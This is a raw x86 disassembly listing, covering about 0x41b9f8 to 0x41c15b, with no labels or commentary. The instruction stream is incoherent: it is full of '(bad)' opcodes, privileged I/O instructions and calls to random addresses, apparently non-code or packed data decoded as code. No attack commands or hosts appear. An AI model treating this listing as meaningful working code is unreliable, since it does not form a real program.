  41b9f8:	pop    ebx
  41b9f9:	pop    esi
  41b9fa:	out    0x91,eax
  41b9fc:	fst    st(7)
  41b9fe:	xchg   ebx,eax
  41b9ff:	xchg   edi,eax
  41ba00:	fcomp  st(2)
  41ba02:	mov    edx,0x710b1fd
  41ba07:	xor    BYTE PTR [ecx+0x36a85f6c],ch
  41ba0d:	addr16 jg 0x41b9f1
  41ba10:	mov    ds:0x8f38fc0a,al
  41ba15:	dec    esp
  41ba16:	adc    eax,0x9f0f7408
  41ba1b:	hlt    
  41ba1c:	mov    ds:0x3e605fdc,eax
  41ba21:	push   0x1a
  41ba23:	sbb    cl,al
  41ba25:	pop    edx
  41ba26:	test   al,0x3d
  41ba28:	jmp    0x329a:0xdac61805
  41ba2f:	(bad)  
  41ba30:	neg    BYTE PTR [edx+0x3d0ce03f]
  41ba36:	xor    BYTE PTR [ebp+0x14c55cbe],dl
  41ba3c:	fwait
  41ba3d:	sub    al,0x7a
  41ba3f:	xchg   ah,ch
  41ba41:	jbe    0x41ba40
  41ba43:	scas   eax,DWORD PTR es:[edi]
  41ba44:	pop    edx
  41ba45:	out    dx,al
  41ba46:	jns    0x41ba3b
  41ba48:	jno    0x41ba7b
  41ba4a:	xor    al,0xd0
  41ba4c:	and    DWORD PTR [esi],esp
  41ba4e:	mov    ds:0x8b0ddb32,al
  41ba53:	or     DWORD PTR ds:0xf6cc8b60,0xffffffe3
  41ba5a:	imul   ecx,DWORD PTR [edx-0x72e38d32],0x4e
  41ba61:	test   eax,0x99ba889e
  41ba66:	xor    al,0x5f
  41ba68:	lock inc esi
  41ba6a:	lods   al,BYTE PTR ds:[esi]
  41ba6b:	mov    ebx,0x119918fb
  41ba70:	loop   0x41ba62
  41ba72:	shl    BYTE PTR [eax+eax*2],0x5f
  41ba76:	or     dh,BYTE PTR [eax-0x10127fcd]
  41ba7c:	mov    ch,BYTE PTR [ebx-0x18cdb598]
  41ba82:	mov    ebx,0x43dc52cc
  41ba87:	pop    esp
  41ba88:	in     al,0x50
  41ba8a:	sbb    al,0xa9
  41ba8c:	popa   
  41ba8d:	or     al,0x97
  41ba8f:	adc    eax,0x77109089
  41ba94:	aad    0x53
  41ba96:	stos   BYTE PTR es:[edi],al
  41ba97:	adc    dh,dl
  41ba99:	pop    ds
  41ba9a:	outs   dx,DWORD PTR ds:[esi]
  41ba9b:	push   0x233fd46
  41baa0:	aas    
  41baa1:	inc    ebp
  41baa2:	jno    0x41ba40
  41baa4:	jl     0x41ba9a
  41baa6:	loopne 0x41baaf
  41baa8:	mov    cl,0x3
  41baaa:	inc    ebp
  41baab:	ss pusha 
  41baad:	shr    edx,1
  41baaf:	enter  0x11fd,0x9
  41bab3:	or     bl,BYTE PTR [ebx*8+0x6ee2fe86]
  41baba:	imul   esp,DWORD PTR [edx+0x4b],0xdefe1fb2
  41bac1:	push   ss
  41bac2:	add    ebp,ebx
  41bac4:	test   al,0xb4
  41bac6:	sub    bl,ch
  41bac8:	jle    0x41bab5
  41baca:	call   0x81f29698
  41bacf:	xor    BYTE PTR [edi],bh
  41bad1:	inc    ecx
  41bad2:	scas   eax,DWORD PTR es:[edi]
  41bad3:	xchg   BYTE PTR [ecx+0x726c45ad],bl
  41bad9:	out    0x82,eax
  41badb:	cmp    DWORD PTR ds:0xf09f809b,0x63
  41bae2:	or     BYTE PTR ss:[ebx-0x6b],cl
  41bae6:	mov    edx,edx
  41bae8:	add    eax,0xd20b8b96
  41baed:	mov    edx,0x8e4419e1
  41baf2:	jecxz  0x41ba97
  41baf4:	sbb    DWORD PTR [ebp+0x13a71a25],ebp
  41bafa:	mov    al,0x3d
  41bafc:	fstp   DWORD PTR [esp+eax*1]
  41baff:	dec    eax
  41bb00:	mov    ch,0xb7
  41bb02:	push   ebx
  41bb03:	fwait
  41bb04:	pop    ss
  41bb05:	sub    eax,0xecc1241b
  41bb0a:	push   ebx
  41bb0b:	icebp  
  41bb0c:	lods   eax,DWORD PTR ds:[esi]
  41bb0d:	loope  0x41bad8
  41bb0f:	or     ah,BYTE PTR [edx-0x70db37ea]
  41bb15:	and    esp,DWORD PTR [eax-0x30]
  41bb18:	das    
  41bb19:	(bad)  
  41bb1b:	dec    edx
  41bb1c:	stos   BYTE PTR es:[edi],al
  41bb1d:	jno    0x41bb5a
  41bb1f:	mov    esi,0x8941bcfb
  41bb24:	rcl    DWORD PTR [edi+edx*4-0x53],1
  41bb28:	nop
  41bb29:	inc    edx
  41bb2a:	shr    DWORD PTR [ebp-0x1cc3049d],cl
  41bb30:	mov    eax,ds:0x605ac63d
  41bb35:	gs mov eax,0x584a0a08
  41bb3b:	or     DWORD PTR [edi+0x620dc3fc],edx
  41bb41:	pop    esp
  41bb42:	or     al,0xfd
  41bb44:	push   es
  41bb45:	icebp  
  41bb46:	cmc    
  41bb47:	adc    BYTE PTR [ecx+0x394a3acf],bl
  41bb4d:	arpl   WORD PTR [edi+eax*8+0x1d],cx
  41bb51:	xor    eax,0xa72af8aa
  41bb56:	adc    BYTE PTR [edx-0x3199a98c],dl
  41bb5c:	mov    cl,0x63
  41bb5e:	or     edx,DWORD PTR [ebx+eiz*1]
  41bb61:	mov    ch,0x71
  41bb63:	add    al,BYTE PTR [edx]
  41bb65:	sbb    BYTE PTR [esi],dh
  41bb67:	aaa    
  41bb68:	jp     0x41bb0e
  41bb6a:	fmul   DWORD PTR ss:[ecx+0x1dd93a8d]
  41bb71:	aas    
  41bb72:	lock mov esp,0x963dcac0
  41bb78:	pop    ecx
  41bb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb7a:	std    
  41bb7b:	stos   BYTE PTR es:[edi],al
  41bb7c:	es xor eax,0xb915e815
  41bb82:	sub    eax,0x254f1907
  41bb87:	scas   eax,DWORD PTR es:[edi]
  41bb88:	ret    0x4c01
  41bb8b:	add    esp,DWORD PTR [eax-0x301c4363]
  41bb91:	jae    0x41bbc5
  41bb93:	repz lock fs xchg edi,eax
  41bb97:	inc    ebx
  41bb98:	gs call 0xbb2a:0x6e63f1a8
  41bba0:	test   eax,0xe6a0921
  41bba5:	pop    ds
  41bba6:	bound  esp,QWORD PTR [eax+edx*8+0xa]
  41bbaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbab:	loop   0x41bb4b
  41bbad:	inc    ebx
  41bbae:	adc    DWORD PTR [esi+0x66fd9af8],edi
  41bbb4:	xchg   BYTE PTR [ebx-0x13],ch
  41bbb7:	cmc    
  41bbb8:	neg    DWORD PTR [edi+0x51]
  41bbbb:	mov    cl,0xf8
  41bbbd:	mov    ch,0xaa
  41bbbf:	xor    al,0xf
  41bbc1:	fwait
  41bbc2:	add    esi,edx
  41bbc4:	pop    eax
  41bbc5:	shl    dh,0xa3
  41bbc8:	sbb    ecx,DWORD PTR [ebx]
  41bbca:	loop   0x41bb9e
  41bbcc:	popa   
  41bbcd:	inc    ebp
  41bbce:	sub    BYTE PTR [edi+0x19],cl
  41bbd1:	mov    ds:0xab4b10df,eax
  41bbd6:	lea    ecx,[edx-0x592a0847]
  41bbdc:	jne    0x41bc2a
  41bbde:	mov    esp,cs
  41bbe0:	stos   DWORD PTR es:[edi],eax
  41bbe1:	sar    BYTE PTR [esi+eiz*1-0x25],1
  41bbe5:	in     eax,dx
  41bbe6:	(bad)  
  41bbe7:	outs   dx,DWORD PTR ds:[esi]
  41bbe8:	lds    edx,FWORD PTR [edi-0x1bd09b45]
  41bbee:	cli    
  41bbef:	cmp    al,0x91
  41bbf1:	mov    edx,ds
  41bbf3:	jle    0x41bbd8
  41bbf5:	cmp    DWORD PTR [ebx+0x15d1a198],0x52
  41bbfc:	bnd jbe 0x41bbe9
  41bbff:	call   0x846fc0a4
  41bc04:	jnp    0x41bc80
  41bc06:	sub    edi,DWORD PTR [ebx-0x3936bce8]
  41bc0c:	mov    esp,0x4db02fe9
  41bc11:	jno    0x41bb94
  41bc13:	xchg   edx,eax
  41bc14:	hlt    
  41bc15:	dec    esp
  41bc16:	add    al,0x5
  41bc18:	aas    
  41bc19:	xor    DWORD PTR [esi],edx
  41bc1b:	ret    
  41bc1c:	scas   al,BYTE PTR es:[edi]
  41bc1d:	stos   BYTE PTR es:[edi],al
  41bc1e:	lea    ecx,[ebp+edi*8+0x9]
  41bc22:	and    eax,0x272c9dc
  41bc27:	fldcw  WORD PTR [ecx]
  41bc29:	cmp    BYTE PTR [edi-0x26],0x15
  41bc2d:	stos   DWORD PTR es:[edi],eax
  41bc2e:	ins    BYTE PTR es:[edi],dx
  41bc2f:	push   esp
  41bc30:	and    BYTE PTR es:[ebx],dh
  41bc33:	popa   
  41bc34:	add    esp,edx
  41bc36:	out    0xf6,eax
  41bc38:	push   cs
  41bc39:	out    dx,eax
  41bc3a:	bound  eax,QWORD PTR [esi-0x75]
  41bc3d:	enter  0x11e8,0x22
  41bc41:	mov    eax,ds:0x8037f9c
  41bc46:	cmp    al,bh
  41bc48:	scas   eax,DWORD PTR es:[edi]
  41bc49:	or     al,0xd3
  41bc4b:	cmp    edi,DWORD PTR [edi+0x50]
  41bc4e:	mov    bh,0x3c
  41bc50:	sub    BYTE PTR [ecx],bl
  41bc52:	lods   al,BYTE PTR ds:[esi]
  41bc53:	je     0x41bc5d
  41bc55:	adc    BYTE PTR [eax-0x1a498776],0x6c
  41bc5c:	adc    DWORD PTR [edi],ebx
  41bc5e:	pop    esi
  41bc5f:	jbe    0x41bc38
  41bc61:	push   es
  41bc62:	and    edx,DWORD PTR [edi-0x63]
  41bc65:	cmp    dl,0x76
  41bc68:	rol    dh,0x6a
  41bc6b:	clc    
  41bc6c:	cld    
  41bc6d:	dec    esi
  41bc6e:	fndisi(8087 only) 
  41bc70:	xchg   edx,eax
  41bc71:	mov    eax,DWORD PTR [ebx-0x3c]
  41bc74:	add    dh,BYTE PTR ds:0x70dd81f4
  41bc7a:	out    dx,eax
  41bc7b:	pop    esi
  41bc7c:	pop    ebx
  41bc7d:	outs   dx,DWORD PTR ds:[esi]
  41bc7e:	mov    dh,0x48
  41bc80:	add    eax,0x575c8f19
  41bc85:	cmp    cl,ah
  41bc87:	lds    eax,FWORD PTR [edx-0x7c]
  41bc8a:	sbb    eax,0x63951d84
  41bc8f:	ins    DWORD PTR es:[edi],dx
  41bc90:	xchg   edi,eax
  41bc91:	xchg   ebx,eax
  41bc92:	mov    eax,ds:0x3d850184
  41bc97:	gs test eax,0x63ac25ad
  41bc9d:	sub    DWORD PTR [edx],ebp
  41bc9f:	xchg   ecx,eax
  41bca0:	(bad)  
  41bca1:	and    al,0x2f
  41bca3:	push   esp
  41bca4:	frstor ds:[edi-0x67b85a18]
  41bcab:	aad    0x42
  41bcad:	in     al,dx
  41bcae:	std    
  41bcaf:	mov    al,ds:0xe9e32594
  41bcb4:	jp     0x41bc4a
  41bcb6:	cmp    DWORD PTR [ebx+0x529cfc68],eax
  41bcbc:	shl    DWORD PTR es:[esi+0x25],0xad
  41bcc1:	inc    ebx
  41bcc2:	xor    BYTE PTR [edx+eiz*4-0x53bddb09],bl
  41bcc9:	shr    BYTE PTR [ebp-0x52],1
  41bccc:	inc    esp
  41bccd:	mov    dh,BYTE PTR [edi+0x50e26456]
  41bcd3:	mov    dl,0x61
  41bcd5:	dec    esi
  41bcd6:	add    eax,eax
  41bcd8:	hlt    
  41bcd9:	arpl   WORD PTR [eax],bx
  41bcdb:	fstp   QWORD PTR [ebx-0x61]
  41bcde:	jl     0x41bcd6
  41bce0:	mov    eax,0x6c9ff329
  41bce5:	ficom  WORD PTR [ecx-0x1aa70008]
  41bceb:	xchg   esi,eax
  41bcec:	mov    bl,0x3c
  41bcee:	popa   
  41bcef:	test   BYTE PTR [ebp+0x438f2e42],ch
  41bcf5:	xchg   BYTE PTR [edi+0x54784043],bl
  41bcfb:	es dec ecx
  41bcfd:	push   0xb85ea861
  41bd02:	cld    
  41bd03:	(bad)
  41bd07:	pop    ebx
  41bd08:	sar    DWORD PTR [edi],0x7b
  41bd0b:	retf   
  41bd0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd0d:	lea    si,[edx-0x28]
  41bd11:	xlat   BYTE PTR ds:[ebx]
  41bd12:	and    cl,BYTE PTR [ebx-0x21]
  41bd15:	fst    QWORD PTR [esi]
  41bd17:	xchg   ebx,eax
  41bd18:	sub    al,0x13
  41bd1a:	adc    esi,ebx
  41bd1c:	mov    bl,0x39
  41bd1e:	ret    
  41bd1f:	xchg   esi,eax
  41bd20:	shr    BYTE PTR [ecx+ebx*2-0x5a828610],cl
  41bd27:	cli    
  41bd28:	aaa    
  41bd29:	mov    al,0xcd
  41bd2b:	test   DWORD PTR [eax-0x2c],esp
  41bd2e:	mov    cl,0xab
  41bd30:	mov    ebp,0x9e0af1c1
  41bd35:	cwde   
  41bd36:	pop    edi
  41bd37:	mov    edi,0xd67b73d7
  41bd3c:	(bad)  
  41bd3d:	jle    0x41bd9d
  41bd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd40:	jge    0x41bcde
  41bd42:	add    BYTE PTR [esi-0x6e14c3b9],al
  41bd48:	adc    ebp,eax
  41bd4a:	mov    al,0x15
  41bd4c:	(bad)  
  41bd4e:	jns    0x41bce2
  41bd50:	and    dl,BYTE PTR [esi]
  41bd52:	bound  ebp,QWORD PTR [ebx+edi*8]
  41bd55:	(bad)  
  41bd56:	push   ebx
  41bd57:	push   cs
  41bd58:	mov    ss,ebp
  41bd5a:	push   edx
  41bd5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd5c:	js     0x41bd21
  41bd5e:	in     eax,dx
  41bd5f:	loopne 0x41bd95
  41bd61:	adc    eax,0x82d676b7
  41bd66:	repz push esi
  41bd68:	fldcw  WORD PTR [edx+0x8]
  41bd6b:	mov    dh,0x23
  41bd6d:	sbb    BYTE PTR [ebp+0x6f4565b9],bh
  41bd73:	lds    esp,FWORD PTR [ebp+0x4]
  41bd76:	adc    DWORD PTR [ecx+0x14],eax
  41bd79:	push   ss
  41bd7a:	mov    DWORD PTR [edi-0x6f],esp
  41bd7d:	stc    
  41bd7e:	lea    edx,[edi]
  41bd80:	mov    ah,0x47
  41bd82:	or     esp,edi
  41bd84:	int3   
  41bd85:	cmp    ecx,esi
  41bd87:	ins    DWORD PTR es:[edi],dx
  41bd88:	add    cl,dh
  41bd8a:	int3   
  41bd8b:	pop    eax
  41bd8c:	lods   eax,DWORD PTR ds:[esi]
  41bd8d:	fdiv   QWORD PTR [ebx]
  41bd8f:	sub    eax,0x37f87bbb
  41bd94:	mov    DWORD PTR [edi+0x5b],ecx
  41bd97:	sahf   
  41bd98:	dec    edx
  41bd99:	aaa    
  41bd9a:	arpl   WORD PTR [edx+0xd],bp
  41bd9d:	mov    BYTE PTR cs:[edx],ch
  41bda0:	jmp    0x8a11:0x7a4ca112
  41bda7:	jmp    0x41bd8a
  41bda9:	inc    esp
  41bdaa:	inc    esi
  41bdab:	in     eax,dx
  41bdac:	sub    BYTE PTR [edi+0x6e5fc0c1],dh
  41bdb2:	mov    esi,0x4365b8e0
  41bdb7:	ds aas 
  41bdb9:	sub    DWORD PTR [edx-0x4f],ecx
  41bdbc:	in     eax,0xfe
  41bdbe:	jmp    0x666ce61
  41bdc3:	aas    
  41bdc4:	lds    esp,FWORD PTR [ecx-0x5c]
  41bdc7:	mov    edx,0x1674ce36
  41bdcc:	push   ebp
  41bdcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdce:	or     BYTE PTR [edx-0x13],dh
  41bdd1:	push   ds
  41bdd2:	stc    
  41bdd3:	(bad)  
  41bdd4:	jg     0x41be10
  41bdd6:	test   al,0x16
  41bdd8:	mov    eax,0x3cffa8d7
  41bddd:	mov    eax,ds:0x6b72b776
  41bde2:	inc    ecx
  41bde3:	pusha  
  41bde4:	icebp  
  41bde5:	sti    
  41bde6:	(bad)  
  41bde8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bde9:	sub    bh,BYTE PTR [ebp+0x2a89492d]
  41bdef:	clc    
  41bdf0:	xchg   ebx,eax
  41bdf1:	cmp    ch,bh
  41bdf3:	rcr    BYTE PTR [bx+si],1
  41bdf6:	fiadd  WORD PTR [esi+0x20]
  41bdf9:	mov    BYTE PTR [eax+0x5],0xab
  41bdfd:	push   ss
  41bdfe:	nop
  41bdff:	(bad)  
  41be00:	mov    esp,0xe35f957c
  41be05:	cmp    ah,bl
  41be07:	sub    eax,0xead0fb6b
  41be0c:	jecxz  0x41be38
  41be0e:	cmp    bh,cl
  41be10:	adc    DWORD PTR [edi],edx
  41be12:	sbb    al,0xc
  41be14:	adc    BYTE PTR [ecx+0x1537acc8],ah
  41be1a:	out    0x14,eax
  41be1c:	lods   eax,DWORD PTR ds:[esi]
  41be1d:	adc    DWORD PTR [ebp-0x340384fe],ebp
  41be23:	lock mov dh,0x42
  41be26:	fiadd  WORD PTR [edx-0x62]
  41be29:	inc    esi
  41be2a:	push   ebp
  41be2b:	and    edx,DWORD PTR [esi+0x1e]
  41be2e:	mov    edx,DWORD PTR [ebx+0x2306359b]
  41be34:	rol    DWORD PTR [esi],cl
  41be36:	add    esi,DWORD PTR ds:0x748191a3
  41be3c:	sahf   
  41be3d:	mov    dh,0x38
  41be3f:	mov    esi,0xf5225979
  41be44:	mov    bh,BYTE PTR [eax+ebp*1-0x4056f7c0]
  41be4b:	stos   BYTE PTR es:[edi],al
  41be4c:	push   es
  41be4d:	jnp    0x41bde3
  41be4f:	ja     0x41be51
  41be51:	lock loop 0x41be07
  41be54:	xor    DWORD PTR [ecx-0x5e],0x9556be37
  41be5b:	sub    DWORD PTR [edi+0x209a1d4a],ebx
  41be61:	test   BYTE PTR [ebp-0x18],bl
  41be64:	fdivr  DWORD PTR [edx]
  41be66:	xor    BYTE PTR [eax+0x7c8cb207],bh
  41be6c:	push   esp
  41be6d:	jg     0x41beca
  41be6f:	mov    eax,0x4c2799da
  41be74:	jne    0x41bedc
  41be76:	jns    0x41bea8
  41be78:	(bad)  
  41be79:	into   
  41be7a:	inc    ebp
  41be7b:	sbb    ah,bh
  41be7d:	std    
  41be7e:	cmp    eax,0x375892e8
  41be83:	out    dx,eax
  41be84:	out    0xc5,al
  41be86:	mov    ebx,0xbfef6371
  41be8b:	mov    eax,0x6b2671ac
  41be90:	mov    DWORD PTR [ebx+0x6a],0x62a10c3a
  41be97:	js     0x41be52
  41be99:	out    dx,al
  41be9a:	lahf   
  41be9b:	adc    dh,BYTE PTR fs:[ecx]
  41be9e:	dec    ecx
  41be9f:	pushf  
  41bea0:	aaa    
  41bea1:	in     eax,0xc8
  41bea3:	data16 in al,0x76
  41bea6:	mov    ebp,0x9a50fe00
  41beab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beac:	push   ecx
  41bead:	sbb    edx,0x193ef3ad
  41beb3:	pushf  
  41beb4:	xor    ebx,DWORD PTR [ecx+eiz*8]
  41beb7:	test   ebp,ecx
  41beb9:	and    DWORD PTR [edi],0xfbacdfb8
  41bebf:	mov    BYTE PTR [esi],ah
  41bec1:	stos   DWORD PTR es:[edi],eax
  41bec2:	imul   edi,DWORD PTR ds:[edx],0xdb716ee1
  41bec9:	stc    
  41beca:	mov    ss,WORD PTR [esi]
  41becc:	sbb    eax,0x7d82802d
  41bed1:	(bad)  
  41bed2:	popa   
  41bed3:	imul   ebx,DWORD PTR [ecx-0x37],0x4d
  41bed7:	jmp    0x41bef4
  41bed9:	fwait
  41beda:	mov    ch,0x56
  41bedc:	mov    esi,0xefd0244
  41bee1:	fldcw  WORD PTR [edx-0xc05ac69]
  41bee7:	mov    ds:0x360baee,al
  41beec:	pop    ss
  41beed:	iret   
  41beee:	jmp    0x41beef
  41bef0:	(bad)  
  41bef1:	adc    ecx,DWORD PTR [ebp-0x1545b1f]
  41bef7:	mov    eax,0xbf9f85ff
  41befc:	iret   
  41befd:	dec    edi
  41befe:	lock mov ebp,0xc86dedd0
  41bf04:	pop    edx
  41bf05:	sbb    al,0x4f
  41bf07:	jns    0x41bee5
  41bf09:	sbb    ecx,ebx
  41bf0b:	mov    dh,0xdc
  41bf0d:	in     al,dx
  41bf0e:	imul   ecx,DWORD PTR [ebx+0x2ba445dc],0x4e
  41bf15:	std    
  41bf16:	inc    edx
  41bf17:	aad    0xd5
  41bf19:	sub    al,0xe2
  41bf1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf1c:	lea    edi,[ecx-0x62e80455]
  41bf22:	in     eax,0xd5
  41bf24:	xchg   ebp,eax
  41bf25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf26:	xchg   ebx,eax
  41bf27:	repz ds jl 0x41bf25
  41bf2b:	fwait
  41bf2c:	jg     0x41beec
  41bf2e:	ficomp DWORD PTR [ecx+0x6b]
  41bf31:	cmp    al,0x38
  41bf33:	pop    ebp
  41bf34:	mov    dh,0x8a
  41bf36:	adc    edi,DWORD PTR es:[edx]
  41bf39:	or     BYTE PTR [edx-0x38],ah
  41bf3c:	call   0xfd7bd6bf
  41bf41:	inc    ebx
  41bf42:	inc    ecx
  41bf43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf44:	add    esp,esp
  41bf46:	nop
  41bf47:	push   ds
  41bf48:	shl    BYTE PTR [esi],cl
  41bf4a:	sbb    DWORD PTR [esi+esi*2],ecx
  41bf4d:	(bad)  
  41bf50:	xchg   edx,eax
  41bf51:	xchg   esp,eax
  41bf52:	aam    0xb
  41bf54:	mov    ds:0x9ab4cd04,eax
  41bf59:	or     ebp,DWORD PTR [edx+ebp*4-0x20cf80b]
  41bf60:	pop    eax
  41bf61:	leave  
  41bf62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf63:	cdq    
  41bf64:	inc    ebx
  41bf65:	outs   dx,DWORD PTR ds:[esi]
  41bf66:	repnz ror BYTE PTR [edi],0x5d
  41bf6a:	icebp  
  41bf6b:	lds    ebx,FWORD PTR [ebx-0x519e9785]
  41bf71:	sar    DWORD PTR [edx],0x27
  41bf74:	mov    edi,0x57433e88
  41bf79:	dec    edi
  41bf7a:	sub    eax,0xe03aa0e3
  41bf7f:	bound  edx,QWORD PTR [edx+0x25]
  41bf82:	repz mov ch,0x8f
  41bf85:	add    BYTE PTR [ebp+0xa],0x50
  41bf89:	push   0x693814fe
  41bf8e:	call   0x54941352
  41bf93:	retf   
  41bf94:	lock cld 
  41bf96:	or     DWORD PTR [eax+0x16b52733],ebp
  41bf9c:	inc    esp
  41bf9d:	out    0x9f,eax
  41bf9f:	(bad)  
  41bfa0:	scas   eax,DWORD PTR es:[edi]
  41bfa1:	push   eax
  41bfa2:	dec    ecx
  41bfa3:	and    BYTE PTR [ebx+0xd02ce7b],bl
  41bfa9:	add    edi,eax
  41bfab:	leave  
  41bfac:	sti    
  41bfad:	and    al,0xf7
  41bfaf:	xchg   BYTE PTR [esi-0x55],dl
  41bfb2:	sub    al,0x2e
  41bfb4:	dec    eax
  41bfb5:	in     eax,0x35
  41bfb7:	push   esp
  41bfb8:	xchg   edx,eax
  41bfb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfba:	sub    edi,DWORD PTR ds:0x932c39ca
  41bfc0:	jno    0x41bf43
  41bfc2:	shr    DWORD PTR [ebx],cl
  41bfc4:	(bad)  
  41bfc5:	jmp    0x2f90d0d5
  41bfca:	cli    
  41bfcb:	into   
  41bfcc:	add    al,0xd4
  41bfce:	pop    eax
  41bfcf:	or     DWORD PTR [ecx+0x689e0b68],edi
  41bfd5:	push   edx
  41bfd6:	(bad)  
  41bfd7:	ror    DWORD PTR [ebp-0x65],0x83
  41bfdb:	sar    DWORD PTR [bx],0x58
  41bfdf:	and    eax,0x52411e8e
  41bfe4:	inc    ecx
  41bfe5:	mov    ds:0x1823bcf,al
  41bfea:	mov    DWORD PTR [edx+ecx*4],edi
  41bfed:	sbb    ah,BYTE PTR [ebx+0x76d47bd1]
  41bff3:	push   es
  41bff4:	das    
  41bff5:	test   BYTE PTR [edx-0x9],dl
  41bff8:	retf   0x78c7
  41bffb:	xchg   BYTE PTR [ebp+0x5f],bl
  41bffe:	xchg   BYTE PTR [eax+ebx*2+0x63],ah
  41c002:	(bad)  
  41c003:	jnp    0x41c058
  41c005:	jp     0x41c01f
  41c007:	sbb    BYTE PTR [edx-0x195c9f59],0x18
  41c00e:	fistp  QWORD PTR [ebx+0x2a2b7607]
  41c014:	dec    ebx
  41c015:	aaa    
  41c016:	push   esi
  41c017:	adc    al,0x91
  41c019:	fimul  DWORD PTR [ebx]
  41c01b:	aam    0xca
  41c01d:	repz push ebx
  41c01f:	cmp    DWORD PTR [edi+0x42],esi
  41c022:	ins    DWORD PTR es:[edi],dx
  41c023:	cdq    
  41c024:	mov    eax,ds:0xa7523a2
  41c029:	pop    ebp
  41c02a:	cmp    edi,DWORD PTR [bx+si+0x345b]
  41c02f:	out    0x7c,al
  41c031:	rcl    esp,cl
  41c033:	inc    esp
  41c034:	not    BYTE PTR [eax-0x6869233]
  41c03a:	pop    ecx
  41c03b:	push   es
  41c03c:	dec    ebp
  41c03d:	dec    ecx
  41c03e:	test   al,0xe4
  41c040:	pop    ds
  41c041:	inc    edi
  41c042:	lds    esp,FWORD PTR [eax-0x2]
  41c045:	sbb    DWORD PTR [ebp+0x39],ebp
  41c048:	(bad)  
  41c04a:	shl    ah,1
  41c04c:	loopne 0x41c0cc
  41c04e:	inc    esi
  41c04f:	fimul  DWORD PTR [ecx+0x7b]
  41c052:	adc    cl,BYTE PTR [edi+edi*8-0x19]
  41c056:	dec    esp
  41c057:	push   es
  41c058:	dec    esp
  41c059:	js     0x41c02a
  41c05b:	enter  0xfa09,0x10
  41c05f:	icebp  
  41c060:	adc    edx,edi
  41c062:	cmp    DWORD PTR [edi],edx
  41c064:	bound  edx,QWORD PTR [esi]
  41c066:	xchg   edx,eax
  41c067:	mov    bl,0x74
  41c069:	sub    DWORD PTR [edx],edx
  41c06b:	fs es jp 0x41c02f
  41c06f:	mov    esp,0x4a35d15a
  41c074:	pop    esi
  41c075:	push   esi
  41c076:	loope  0x41c0f6
  41c078:	mov    al,0x1e
  41c07a:	pop    ss
  41c07b:	shl    bl,0xb2
  41c07e:	sti    
  41c07f:	cmp    BYTE PTR [eax-0x69ad09fa],cl
  41c085:	in     eax,0xea
  41c087:	sbb    eax,0x728bc871
  41c08c:	fidiv  DWORD PTR [ecx+0x5069f516]
  41c092:	xchg   ecx,eax
  41c093:	std    
  41c094:	xchg   esi,eax
  41c095:	push   0xffffff89
  41c097:	mov    ebx,0x99d85356
  41c09c:	fld    DWORD PTR [ebp-0x65c6fba4]
  41c0a2:	(bad)  
  41c0a3:	hlt    
  41c0a4:	pushf  
  41c0a5:	xor    ah,BYTE PTR [edi]
  41c0a7:	popa   
  41c0a8:	aam    0x3b
  41c0aa:	push   es
  41c0ab:	add    ecx,DWORD PTR [edx-0x477fb75e]
  41c0b1:	in     eax,0xda
  41c0b3:	ja     0x41c12b
  41c0b5:	pop    ecx
  41c0b6:	and    DWORD PTR [ebp+0x242d2da9],0x5a
  41c0bd:	out    0x31,eax
  41c0bf:	test   DWORD PTR [esp+ebp*1],ecx
  41c0c2:	jb     0x41c119
  41c0c4:	xor    DWORD PTR [edi],edi
  41c0c6:	(bad)  
  41c0c7:	fdiv   QWORD PTR [ebx]
  41c0c9:	push   0x1a
  41c0cb:	mov    edi,0xffdbe492
  41c0d0:	push   es
  41c0d1:	fs repnz inc edx
  41c0d4:	out    0xc6,al
  41c0d6:	mov    eax,esi
  41c0d8:	(bad)  
  41c0d9:	sbb    edx,ebp
  41c0db:	xchg   ecx,eax
  41c0dc:	jne    0x41c08a
  41c0de:	sbb    ch,BYTE PTR [edi]
  41c0e0:	(bad)  
  41c0e2:	push   ecx
  41c0e3:	rcr    BYTE PTR [ebx+0x55],cl
  41c0e6:	mov    eax,ds:0x3390c799
  41c0eb:	xchg   ebp,eax
  41c0ec:	leave  
  41c0ed:	aam    0xd5
  41c0ef:	sbb    BYTE PTR [esi-0x4d09b58f],dh
  41c0f5:	loopne 0x41c08a
  41c0f7:	rol    BYTE PTR [esi-0x9bc5ed6],0x43
  41c0fe:	test   eax,0x4a437ad8
  41c103:	jg     0x41c148
  41c105:	mov    eax,0x8babc2fe
  41c10a:	sbb    al,BYTE PTR [edi]
  41c10c:	push   0x23
  41c10e:	ins    BYTE PTR es:[edi],dx
  41c10f:	adc    BYTE PTR [ebx+0x5],0x7c
  41c113:	out    dx,al
  41c114:	add    eax,0x8c4e93c6
  41c119:	loope  0x41c0c7
  41c11b:	int3   
  41c11c:	ins    DWORD PTR es:[edi],dx
  41c11d:	loope  0x41c116
  41c11f:	scas   eax,DWORD PTR es:[edi]
  41c120:	dec    eax
  41c121:	(bad)  
  41c123:	loop   0x41c14b
  41c125:	cmp    ebx,DWORD PTR [ebx+0x3c]
  41c128:	imul   esi,edi,0xffffff8c
  41c12b:	in     eax,dx
  41c12c:	and    ah,BYTE PTR [esi-0x7c274ba4]
  41c132:	pop    ecx
  41c133:	pop    es
  41c134:	rcr    BYTE PTR [ecx+0x26],1
  41c137:	in     al,0x46
  41c139:	sbb    edi,DWORD PTR [ebp-0x47]
  41c13c:	mov    ecx,0x6e161d73
  41c141:	jmp    0x41c101
  41c143:	pop    esp
  41c144:	sub    al,0x1e
  41c146:	mov    eax,0xe681efce
  41c14b:	out    dx,eax
  41c14c:	push   0xe2f378ab
  41c151:	es aaa 
  41c153:	xrelease mov DWORD PTR [edx+0x58],ebx
  41c157:	cmp    bh,ah
  41c159:	or     ah,bl
  41c15b:	cmp    al,0x52
